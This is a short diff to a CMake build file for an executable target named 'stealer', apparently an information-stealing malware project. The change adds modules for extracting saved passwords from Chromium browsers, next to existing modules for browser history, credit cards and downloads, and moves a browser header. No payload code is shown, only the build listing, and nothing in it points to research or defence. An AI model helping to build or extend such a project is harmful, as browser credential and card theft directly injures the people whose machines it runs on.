@@ -73,11 +73,13 @@ add_executable(stealer src/main.cpp
         src/stealer/impl/brownsers/chromium/impl/CHistory.cpp
         src/stealer/impl/brownsers/chromium/impl/CHistory.h
         src/stealer/impl/brownsers/BrowserModule.h
-        src/stealer/impl/brownsers/Browsers.h
         src/stealer/impl/brownsers/chromium/impl/CCreditCards.cpp
         src/stealer/impl/brownsers/chromium/impl/CCreditCards.h
         src/stealer/impl/brownsers/chromium/impl/CDownloads.cpp
         src/stealer/impl/brownsers/chromium/impl/CDownloads.h
+        src/stealer/impl/brownsers/chromium/impl/CPasswords.cpp
+        src/stealer/impl/brownsers/chromium/impl/CPasswords.h
+        src/stealer/impl/brownsers/chromium/ChromiumBrowserModule.h
 )
 
 target_link_libraries(stealer
